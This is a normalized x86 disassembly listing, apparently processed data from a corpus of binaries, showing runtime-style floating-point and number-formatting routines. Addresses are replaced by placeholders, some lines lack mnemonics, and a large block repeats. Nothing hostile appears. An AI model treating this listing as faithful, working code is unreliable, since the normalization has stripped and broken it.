pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_41c8f0
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_41ce34
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_413b77
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_40efdc
test eax eax
movsx eax [ esi ]
push eax
call sub_413b77
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
inc esi
inc esi
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_41cea7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40e5f8
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_41cf29
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_41cf45
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_41e895
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_41e7ed
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_41cfa1
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_410680
inc eax
push eax
push esi
add esi edi
push esi
call sub_40fdd0
add esp 0x10
sub_41cfe6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_40e5f8
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebp + 0x8 ] esi
jbe r-xdata
call sub_410cee
push 0x16
cmp [ ebp + 0xc ] esi
jle r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] 0x0
je r-xdata
call sub_410cee
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] esi
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_41cfa1
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_40edf4
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
lea eax [ esi + 0x1 ]
mov cl [ eax ]
mov [ esi ] cl
mov esi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40eccc
add esp 0x14
push r--data
push ebx
push esi
call sub_413c11
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
inc esi
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
inc esi
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi ] 0x2d
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_40fdd0
add esp 0xc
inc esi
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi ] al
mov eax edx
add [ esi + 0x1 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi ] al
mov eax edx
sub_41d155
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_41eab9
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_40edf4
add esp 0x14
mov eax esi
jmp r-xdata
mov esi [ ebp + 0x14 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e1e0
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
cmp esi ebx
setg cl
sub eax ecx
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push ebx
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_41cfe6
add esp 0x18
mov [ edi ] bl
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
cmp esi ebx
setg cl
add eax edi
add ecx eax
push ecx
call sub_41e93d
add esp 0x10
cmp eax ebx
je r-xdata
sub_41d225
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41d155
add esp 0x18
pop ebp
retn
sub_41d245
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_40e5f8
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_410cee
push 0x16
mov eax [ ebp + 0x14 ]
